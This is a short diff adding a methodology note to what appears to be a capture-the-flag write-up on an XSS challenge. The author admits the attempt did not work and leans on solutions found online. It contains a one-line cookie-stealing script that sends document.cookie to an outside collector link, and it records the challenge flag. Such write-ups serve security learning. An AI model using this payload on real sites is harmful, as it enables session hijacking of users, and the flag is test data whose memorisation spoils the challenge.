@@ -1,0 +1,5 @@
+# Methodology
+* Couldnt actually get this to work, but the solutions online seem to indicate that this was the right exploit
+* XSS attack, with a link created from postbin
+* <script> location.href = "<linke>?cookie=" + document.cookie;
+* flag: CTF{8aaa2f34b392b415601804c2f5f0f24e}
